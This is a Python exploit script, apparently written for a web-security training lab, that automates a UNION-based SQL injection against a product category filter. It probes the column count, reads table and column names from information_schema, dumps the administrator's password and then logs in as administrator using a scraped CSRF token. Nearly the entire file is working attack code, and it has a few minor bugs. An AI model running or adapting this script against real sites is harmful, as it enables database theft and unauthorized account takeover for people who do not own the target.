import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

#Disable warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Making request go through the proxy for debugging 
proxy = {"http":"http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

#Change the category to something you have in the lab
uri = "/filter?category=Pets"


#Checking the number of columns since this is a UNION SQL injection
def column_count(url):
    for i in range(1,21):
        payload = f"'ORDER BY {i}--"
        request = requests.get(url + uri + payload, verify=False, proxies=proxy)
        if "Internal Server Error" in request.text:
            return i - 1


#Getting the table name
def get_table_name(url, middle_part):
    payload = f"'UNION SELECT table_name" + middle_part + "from information_schema.tables--"
    request = requests.get(url + uri + payload, verify=False, proxies=proxy)
    res = request.text
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False


#Getting the usernames & password columns from the users table
def get_users_columns(url, middle_part):
    payload = f"'UNION SELECT column_name" + middle_part + f"from information_schema.columns where (table_name='{get_table_name(url,middle_part)}')--"
    request = requests.get(url + uri + payload, verify=False, proxies=proxy)
    res = request.text
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(string=re.compile('.*username.*'))
    password_column = soup.find(string=re.compile('.*password.*'))
    return username_column, password_column
        

#Getting the final request that we will search for administrator password in
def get_final_res(url, middle_part):
    user_table_name = get_table_name(url, middle_part)
    user_column,password_column = get_users_columns(url,middle_part)
    middle_part = ",null " * (columns-2)
    payload = f"'UNION SELECT {user_column},{password_column} " + middle_part + f"from {user_table_name}--"
    request = requests.get(url + uri + payload, verify=False, proxies=proxy)
    res = request.text
    return res


#Getting the administrator user's password
def get_administrator_creds(res):
    request = requests
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
    return admin_password


#Logging in as administrator
def login_as_administrator(url, the_session):
    csrf = get_csrf(url, the_session),
    creds = {"csrf": csrf, "username":"administrator","password": administrator_password}
    request = the_session.post(url + "/login", data=creds, verify=False, proxies=proxy)
    if "Log out" in request.text:
        return True
    else:
        return False

#Getting csrf token to login
def get_csrf(url, the_session):
    uri = "/login"
    request = the_session.get(url + uri, verify=False, proxies=proxy)
    extracted_text = BeautifulSoup(request.text, "html.parser")
    csrf_token = extracted_text.find("input", {"name":"csrf"})["value"]
    return csrf_token


if __name__ == "__main__":
    try:
        #Making sure the user provides the url
        url = sys.argv[1].strip()
        #Setting the column count as a global variable
        columns = column_count(url)
        #Setting the middle part of the payloads as a global variable
        middle_part = ",null " * (columns-1)
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        sys.exit(-1)
    the_session = requests.Session()

    users_table = get_table_name(url, middle_part)
    if users_table:
        print(f"Successfuly retrived table name: {users_table}")
        
        username_column,password_column = get_users_columns(url, middle_part)
        
        if username_column and password_column:
            print(f"Successfully retrived usernames column: {username_column}")
            print(f"Successfully retrived passwords column: {password_column}")

            administrator_password = get_administrator_creds(get_final_res(url,middle_part))
            
            if administrator_password:
                print(f"Successfully retrived administrator password: {administrator_password}")
                print("Logging in as administrator...")
                if login_as_administrator(url, the_session):
                    print("Successfully logged in")
                else:
                    ("something went wrong")
                
            
            else:
                print("Couldn't find administrator password")
        
        else:
            print("Couldn't find username & password columns")
    
    else:
        print("Couldn't find table name")

